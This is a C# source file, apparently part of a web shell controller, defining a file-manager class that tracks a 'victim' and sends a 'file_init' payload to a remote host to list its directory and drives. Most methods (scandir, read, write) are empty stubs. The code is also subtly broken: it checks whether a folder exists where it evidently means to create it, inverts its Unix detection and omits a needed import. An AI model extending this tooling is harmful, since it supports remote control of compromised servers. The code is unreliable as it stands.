using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    internal class clsfnFileMgr
    {
        private clsWeb m_web { get; set; }
        public string m_szFolderPath { get; set; }

        public clsfnFileMgr(clsWeb web)
        {
            m_web = web;
            m_szFolderPath = Path.Combine(web.m_victim.m_szPortfolio, "File");

            if (!Directory.Exists(m_szFolderPath))
                Directory.Exists(m_szFolderPath);
        }

        public struct stInit
        {
            public string szCurrentDir;
            public List<string> lsLogicalDrive;
            public bool bUnixLike { get { return szCurrentDir.Contains(":"); } }
        }

        public struct stEntry
        {
            public bool bIsDirectory;
            public string szEntryPath;
            public int nSize;
            public string szPriviledge;
            public string szSize { get { return clsTool.fnSizeNormalization(nSize); } }

            public DateTime dtCreationDate;
            public DateTime dtLastModifiedDate;
            public DateTime dtLastAccessedDate;
        }

        public async Task<stInit> fnszInit()
        {
            string[] szData = (await m_web.fnszSendPayload("file_init")).Split('|');
            string szCurrentDir = szData[0];
            List<string> lsDrive = szData[1].Split(',').ToList();

            stInit init = new stInit()
            {
                szCurrentDir = szCurrentDir,
                lsLogicalDrive = lsDrive,
            };

            return init;
        }

        public List<stEntry> fnleScandir(string szTargetDirPath)
        {
            szTargetDirPath = szTargetDirPath.Replace("\\", "/");
            List<stEntry> l = new List<stEntry>();



            return l;
        }

        public bool fnbWrite(string szFilePath, string szContent)
        {
            try
            {
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public string fnszRead(string szFilePath)
        {
            return string.Empty;
        }
    }
}
